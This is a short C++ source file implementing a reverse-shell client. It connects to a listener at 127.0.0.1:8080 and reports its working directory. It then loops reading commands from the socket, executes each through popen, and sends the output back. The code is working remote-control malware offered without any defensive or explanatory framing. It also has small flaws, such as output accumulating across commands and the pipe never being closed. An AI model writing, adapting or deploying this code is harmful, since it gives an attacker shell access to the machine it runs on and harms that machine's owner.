#include <arpa/inet.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

using namespace std;

#define PORT (8080)
#define SEP ("<SePaRaTor>")

int setup_socket();

int main() {
  int client_fd = setup_socket();
  char cmd[1024] = { 0 };
  char cwd[256];
  getcwd(cwd, 256);
  send(client_fd, cwd, sizeof(cwd), 0);
  string result = "";
  while (true) {
    memset(cmd, 0, sizeof(cmd));
    int valread = read(client_fd, cmd, 1024);
    
    char temp_result[1024];
    FILE *fp = popen(cmd, "r");

    while (fgets(temp_result, sizeof(temp_result), fp) != NULL) {
      result += temp_result;
    }
    getcwd(cwd, 256);
    result += SEP;
    result += cwd;
    
    send(client_fd, result.c_str(), result.length(), 0);
  }
  close(client_fd);
  return 0;
}

int setup_socket() {
  int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (socket_fd < 0) {
    printf("socket error \n");
    exit(EXIT_FAILURE);
  }
 
  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);

  //convert address to binary
  inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
  
  int connect_return = connect(socket_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
  if (connect_return < 0) {
    printf("connection Failed \n");
    exit(EXIT_FAILURE);
  }

  return socket_fd;
}